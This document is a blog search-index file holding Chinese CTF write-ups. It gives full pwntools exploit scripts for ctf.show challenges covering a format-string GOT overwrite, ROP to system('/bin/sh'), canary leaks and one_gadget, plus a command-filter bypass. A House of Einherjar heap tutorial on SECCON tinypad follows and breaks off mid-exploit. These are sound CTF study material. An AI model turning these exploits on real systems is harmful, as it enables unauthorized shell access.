<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF-36D-PWN-WP</title>
    <url>/2020/05/07/CTF-36D-PWN-WP/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/3p6gUVzQaCwkTbs.jpg" alt="alt"></p>
<a id="more"></a>

<p>感谢1p0ch师傅</p>
<p>最近参加了ctf.show举办的一个比赛，做了一下pwn题，以下是我的一些wp，由于本人能力有限，菜的一批，如果有什么不对的地方，请多包含。</p>
<h3 id="PWN-签到"><a href="#PWN-签到" class="headerlink" title="PWN_签到"></a>PWN_签到</h3><p>签到题直接nc上去以后发现考察的是linux的基本操作，程序过滤掉了空格，cat，但是我们可以ls查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more&lt;flag               这里&lt;可以绕过空格</span><br></pre></td></tr></table></figure>

<h3 id="PWN-babyFmtstr"><a href="#PWN-babyFmtstr" class="headerlink" title="PWN_babyFmtstr"></a>PWN_babyFmtstr</h3><p>格式化字符串漏洞，我们可以修改got表，这样就有一个无限格式化字符串漏洞的程序了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28028)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">printf_got&#x3D;elf.got[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">memset_addr&#x3D;elf.got[&#39;memset&#39;]</span><br><span class="line">#0x0400AA0</span><br><span class="line">payload1&#x3D;&#39;%64c%11$hn%2656c%12$hnAA&#39;+p64(memset_addr+2)+p64(memset_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA%9$s&#39;+p64(puts_got)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input name:\n&#39;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(&#39;Hello AAAA&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print  (&#39;puts_addr:&#39; +hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base&#x3D;puts_addr-libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">print(&#39;system_addr:&#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">def set_printf_to_system(system):</span><br><span class="line">	printf_got_addr&#x3D;printf_got</span><br><span class="line">	x &#x3D; system &amp; 0xffffffff</span><br><span class="line">	a &#x3D; x &amp; 0xffff</span><br><span class="line">	a1 &#x3D; printf_got_addr</span><br><span class="line">	b &#x3D; (x&gt;&gt;16) &amp; 0xffff</span><br><span class="line">	b1&#x3D;printf_got_addr+2</span><br><span class="line">	if(a&gt;b):</span><br><span class="line">		tmp&#x3D;a</span><br><span class="line">		a&#x3D;b</span><br><span class="line">		b&#x3D;tmp</span><br><span class="line">		tmp&#x3D;a1</span><br><span class="line">		a1&#x3D;b1</span><br><span class="line">		b1&#x3D;tmp</span><br><span class="line">	s&#x3D;&quot;%&quot;+str(a)+&quot;c&quot;</span><br><span class="line">	s+&#x3D;&quot;%12$hn&quot;</span><br><span class="line">	s+&#x3D;&quot;%&quot;+str(b-a)+&quot;c&quot;</span><br><span class="line">	s+&#x3D;&quot;%13$hn&quot;</span><br><span class="line">	for i in range(32-len(s)):</span><br><span class="line">		s+&#x3D;&#39;a&#39;</span><br><span class="line">	s+&#x3D;p64(a1)</span><br><span class="line">	s+&#x3D;p64(b1)</span><br><span class="line">	return s</span><br><span class="line"></span><br><span class="line">payload3&#x3D;set_printf_to_system(system_addr)</span><br><span class="line">print (str(payload3))</span><br><span class="line">#gdb,attach(sh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">payload4&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">sh.sendline(payload4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-MagicString"><a href="#PWN-MagicString" class="headerlink" title="PWN_MagicString"></a>PWN_MagicString</h3><p>程序中没有参数，传入/bin/sh\x00，就可以getshell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28095)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">gets_plt&#x3D;elf.plt[&#39;gets&#39;]</span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">pop_rdi&#x3D;0x0000000000400733</span><br><span class="line">bss_addr&#x3D;0x601080</span><br><span class="line">main_addr&#x3D;0x0000000000400661</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x2a0+&#39;a&#39;*8+p64(pop_rdi)+p64(bss_addr)+p64(gets_plt)+p64(main_addr)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">payload2&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x2a0+&#39;a&#39;*8+p64(pop_rdi)+p64(bss_addr)+p64(system_plt)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-MengxinStack"><a href="#PWN-MengxinStack" class="headerlink" title="PWN_MengxinStack"></a>PWN_MengxinStack</h3><p>程序开启了canary，pie，首先我们泄露canary，然后覆盖返回地址的最后一个字节，让程序可以重新执行，之后再泄露libc，最后one_gadget就可以getshell了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28090)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;A&#39;*0x29</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.recvuntil(&#39;A&#39;*0x28)</span><br><span class="line">canary&#x3D;u64(sh.recv(8))-0x41</span><br><span class="line">print (&#39;canary:&#39; +hex(canary))</span><br><span class="line">ret_addr&#x3D;0xffffffffff600400</span><br><span class="line">ret&#x3D;0xffffffffff600409</span><br><span class="line">#0x0000000000000a62</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x28+p64(canary)+&#39;a&#39;*0x18+&#39;\x04&#39;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x28+&#39;a&#39;*0x8+&#39;a&#39;*0x18</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sh.recvuntil(&#39;a&#39;*0x48)</span><br><span class="line">libc_main_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-240</span><br><span class="line">print (&#39;libc_main_addr:&#39; +hex(libc_main_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;__libc_start_main&#39;,libc_main_addr)</span><br><span class="line">libc_base&#x3D;libc_main_addr-libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">#0x45216</span><br><span class="line">one_gedget&#x3D;libc_base+0x45216</span><br><span class="line">payload4&#x3D;&#39;a&#39;*0x28+p64(canary)+&#39;a&#39;*0x18+p64(one_gedget)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-tang"><a href="#PWN-tang" class="headerlink" title="PWN_tang"></a>PWN_tang</h3><p>和上一道题利用思路一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding &#x3D;&#39;utf-8&#39;</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28006)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn6&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn6&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;%9$p&#39;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(&#39;\x0a&#39;)</span><br><span class="line">canary&#x3D;int(sh.recv(18),16)</span><br><span class="line">print(&#39;canary:&#39; +hex(canary))</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;a&#39;</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x38+p64(canary)+&#39;a&#39;*0x18+&#39;\x08&#39;  </span><br><span class="line">这里覆盖返回地址最后一个字节的时候有错误，调试了半天也没弄明白，本来应该是\x10的，但是我发现\x08可以重新执行程序，\x10就不可以.哪位大佬如果知道可以指点一下。</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload3)</span><br><span class="line"></span><br><span class="line">payload4&#x3D;&#39;%7$p&#39;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&#39;\x9f\x0a&#39;)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">setvbuf_addr&#x3D;int(sh.recv(14),16)-324</span><br><span class="line">print(&#39;setvbuf:&#39; +hex(setvbuf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;setvbuf&#39;,setvbuf_addr)</span><br><span class="line">libc_base&#x3D;setvbuf_addr-libc.dump(&#39;setvbuf&#39;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">#0xf1147</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line">payload5&#x3D;&#39;a&#39;*0x38+p64(canary)+&#39;a&#39;*0x18+p64(one_gadget)</span><br><span class="line">sh.send(payload5)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>CTF Game</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF Game</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Einherjar</title>
    <url>/2020/09/29/House-of-Einherjar/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/hB5evRjO2ngisXV.jpg" alt="alt"></p>
<a id="more"></a>

<h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p>
<p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><h5 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h5><p><code>free</code> 函数中的后向合并核心操作如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* consolidate backward *&#x2F;</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize &#x3D; prev_size(p);</span><br><span class="line">    size +&#x3D; prevsize;</span><br><span class="line">    p &#x3D; chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后向合并是合并低地址的chunk，和prev_size和prev_inuse有关，只要我们可以控制这俩个，修改prev_size的大小，我们就可以通过后向合并，将合并后的chunk定位到任何地方。</p>
<p>但是在合并的过程中需要进行unlink，需要在对应chunk构造好fake chunk来绕过unlink的检测。这种利用方式和chunk extend/overlapping比较相似。</p>
<p>这里的绕过unlink操作和之前有点不一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p-&gt;fd &#x3D; p</span><br><span class="line">p-&gt;bk &#x3D; p</span><br></pre></td></tr></table></figure>

<p>下面以一道例题讲解一下：</p>
<h3 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h3><h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v3; &#x2F;&#x2F; rsi@1</span><br><span class="line">  const char *v4; &#x2F;&#x2F; rdi@1</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rax@4</span><br><span class="line">  int v6; &#x2F;&#x2F; eax@7</span><br><span class="line">  signed int v7; &#x2F;&#x2F; eax@20</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; rax@40</span><br><span class="line">  unsigned __int64 v9; &#x2F;&#x2F; rax@40</span><br><span class="line">  int result; &#x2F;&#x2F; eax@45</span><br><span class="line">  __int64 v11; &#x2F;&#x2F; rcx@45</span><br><span class="line">  int c; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@3</span><br><span class="line">  int i; &#x2F;&#x2F; [sp+8h] [bp-18h]@2</span><br><span class="line">  int v14; &#x2F;&#x2F; [sp+Ch] [bp-14h]@7</span><br><span class="line">  int v15; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  int v16; &#x2F;&#x2F; [sp+14h] [bp-Ch]@19</span><br><span class="line">  __int64 v17; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v17 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  v15 &#x3D; 0;</span><br><span class="line">  write_n(&amp;unk_4019F0, 1LL);</span><br><span class="line">  write_n(</span><br><span class="line">    &quot;  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;</span><br><span class="line">    &quot;&#x2F;&#x2F; _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n&quot;</span><br><span class="line">    &quot;||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n&quot;</span><br><span class="line">    &quot;||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n&quot;</span><br><span class="line">    &quot;||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n&quot;</span><br><span class="line">    &quot;\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     &#x2F;&#x2F;\n&quot;</span><br><span class="line">    &quot;  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;,</span><br><span class="line">    563LL);</span><br><span class="line">  v3 &#x3D; 1LL;</span><br><span class="line">  v4 &#x3D; &amp;unk_4019F0;</span><br><span class="line">  write_n(&amp;unk_4019F0, 1LL);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 3; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(c) &#x3D; i + 49;</span><br><span class="line">      writeln(&quot;+------------------------------------------------------------------------------+\n&quot;, 81LL);</span><br><span class="line">      write_n(&quot; #   INDEX: &quot;, 12LL);</span><br><span class="line">      writeln(&amp;c, 1LL);</span><br><span class="line">      write_n(&quot; # CONTENT: &quot;, 12LL);</span><br><span class="line">      if ( *&amp;tinypad[16 * (i + 16LL) + 8] )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 &#x3D; strlen(*&amp;tinypad[16 * (i + 16LL) + 8]);</span><br><span class="line">        writeln(*&amp;tinypad[16 * (i + 16LL) + 8], v5);</span><br><span class="line">      &#125;</span><br><span class="line">      v3 &#x3D; 1LL;</span><br><span class="line">      v4 &#x3D; &amp;unk_4019F0;</span><br><span class="line">      writeln(&amp;unk_4019F0, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    v14 &#x3D; 0;</span><br><span class="line">    v6 &#x3D; getcmd(v4, v3);</span><br><span class="line">    v15 &#x3D; v6;</span><br><span class="line">    if ( v6 &#x3D;&#x3D; 68 )</span><br><span class="line">    &#123;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      v14 &#x3D; read_int(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      if ( v14 &gt; 0 &amp;&amp; v14 &lt;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *&amp;tinypad[16 * (v14 - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          free(*&amp;tinypad[16 * (v14 - 1 + 16LL) + 8]);&#x2F;&#x2F;            uaf</span><br><span class="line">          *&amp;tinypad[16 * (v14 - 1 + 16LL)] &#x3D; 0LL;</span><br><span class="line">          v3 &#x3D; 9LL;</span><br><span class="line">          v4 &#x3D; &quot;\nDeleted.&quot;;</span><br><span class="line">          writeln(&quot;\nDeleted.&quot;, 9LL);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v3 &#x3D; 8LL;</span><br><span class="line">          v4 &#x3D; &quot;Not used&quot;;</span><br><span class="line">          writeln(&quot;Not used&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 13LL;</span><br><span class="line">        v4 &#x3D; &quot;Invalid index&quot;;</span><br><span class="line">        writeln(&quot;Invalid index&quot;, 13LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v6 &gt; 68 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 !&#x3D; 69 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v6 &#x3D;&#x3D; 81 )</span><br><span class="line">          continue;</span><br><span class="line">LABEL_43:</span><br><span class="line">        v3 &#x3D; 17LL;</span><br><span class="line">        v4 &#x3D; &quot;No such a command&quot;;</span><br><span class="line">        writeln(&quot;No such a command&quot;, 17LL);</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      v14 &#x3D; read_int(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      if ( v14 &gt; 0 &amp;&amp; v14 &lt;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *&amp;tinypad[16 * (v14 - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          c &#x3D; 48;</span><br><span class="line">          strcpy(tinypad, *&amp;tinypad[16 * (v14 - 1 + 16LL) + 8]);</span><br><span class="line">          while ( toupper(c) !&#x3D; 89 )</span><br><span class="line">          &#123;</span><br><span class="line">            write_n(&quot;CONTENT: &quot;, 9LL);</span><br><span class="line">            v8 &#x3D; strlen(tinypad);</span><br><span class="line">            writeln(tinypad, v8);</span><br><span class="line">            write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">            v9 &#x3D; strlen(*&amp;tinypad[16 * (v14 - 1 + 16LL) + 8]);</span><br><span class="line">            read_until(tinypad, v9, 0xAu);</span><br><span class="line">            writeln(&quot;Is it OK?&quot;, 9LL);</span><br><span class="line">            write_n(&quot;(Y&#x2F;n)&gt;&gt;&gt; &quot;, 9LL);</span><br><span class="line">            read_until(&amp;c, 1uLL, 0xAu);</span><br><span class="line">          &#125;</span><br><span class="line">          strcpy(*&amp;tinypad[16 * (v14 - 1 + 16LL) + 8], tinypad);</span><br><span class="line">          v3 &#x3D; 8LL;</span><br><span class="line">          v4 &#x3D; &quot;\nEdited.&quot;;</span><br><span class="line">          writeln(&quot;\nEdited.&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v3 &#x3D; 8LL;</span><br><span class="line">          v4 &#x3D; &quot;Not used&quot;;</span><br><span class="line">          writeln(&quot;Not used&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 13LL;</span><br><span class="line">        v4 &#x3D; &quot;Invalid index&quot;;</span><br><span class="line">        writeln(&quot;Invalid index&quot;, 13LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 !&#x3D; 65 )</span><br><span class="line">        goto LABEL_43;</span><br><span class="line">      while ( v14 &lt;&#x3D; 3 &amp;&amp; *&amp;tinypad[16 * (v14 + 16LL)] )</span><br><span class="line">        ++v14;</span><br><span class="line">      if ( v14 &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 17LL;</span><br><span class="line">        v4 &#x3D; &quot;No space is left.&quot;;</span><br><span class="line">        writeln(&quot;No space is left.&quot;, 17LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v16 &#x3D; -1;</span><br><span class="line">        write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        v16 &#x3D; read_int(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        if ( v16 &lt;&#x3D; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 &#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v7 &#x3D; v16;</span><br><span class="line">          if ( v16 &gt; 0x100 )</span><br><span class="line">            v7 &#x3D; 256;</span><br><span class="line">        &#125;</span><br><span class="line">        v16 &#x3D; v7;</span><br><span class="line">        *&amp;tinypad[16 * (v14 + 16LL)] &#x3D; v7;</span><br><span class="line">        *&amp;tinypad[16 * (v14 + 16LL) + 8] &#x3D; malloc(v16);</span><br><span class="line">        if ( !*&amp;tinypad[16 * (v14 + 16LL) + 8] )</span><br><span class="line">        &#123;</span><br><span class="line">          writerrln(&quot;[!] No memory is available.&quot;, 27LL);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">        read_until(*&amp;tinypad[16 * (v14 + 16LL) + 8], v16, 0xAu);</span><br><span class="line">        v3 &#x3D; 7LL;</span><br><span class="line">        v4 &#x3D; &quot;\nAdded.&quot;;</span><br><span class="line">        writeln(&quot;\nAdded.&quot;, 7LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v15 !&#x3D; 81 );</span><br><span class="line">  result &#x3D; 0;</span><br><span class="line">  v11 &#x3D; *MK_FP(__FS__, 40LL) ^ v17;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞函数如下："><a href="#漏洞函数如下：" class="headerlink" title="漏洞函数如下："></a>漏洞函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 __fastcall read_until(__int64 a1, unsigned __int64 a2, unsigned int a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; &#x2F;&#x2F; rax@3</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; rcx@12</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [sp+Ch] [bp-34h]@1</span><br><span class="line">  unsigned __int64 i; &#x2F;&#x2F; [sp+28h] [bp-18h]@1</span><br><span class="line">  signed __int64 v7; &#x2F;&#x2F; [sp+30h] [bp-10h]@2</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; [sp+38h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; a3;</span><br><span class="line">  v8 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  for ( i &#x3D; 0LL; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 &#x3D; read_n(0, a1 + i, 1uLL);</span><br><span class="line">    if ( v7 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; -1LL;</span><br><span class="line">      goto LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !v7 || *(a1 + i) &#x3D;&#x3D; v5 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) &#x3D; 0;                                &#x2F;&#x2F; off by one</span><br><span class="line">  if ( i &#x3D;&#x3D; a2 &amp;&amp; *(a2 - 1 + a1) !&#x3D; 10 )</span><br><span class="line">    dummyinput(v5);</span><br><span class="line">  result &#x3D; i;</span><br><span class="line">LABEL_12:</span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL) ^ v8;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>1.程序free的时候只将size位清空，而没有将指针清空，就导致uaf漏洞，我们可以通过该漏洞泄露heap_base。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x100,&#39;L0ne1y&#39;)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;) </span><br><span class="line">heap_addr&#x3D;u64(sh.recvline().rstrip().ljust(8, &#39;\x00&#39;))-0x80</span><br><span class="line">sh.success(&#39;heap_addr: &#39; +hex(heap_addr))</span><br></pre></td></tr></table></figure>

<p>2.通过UAF泄露libc_base。</p>
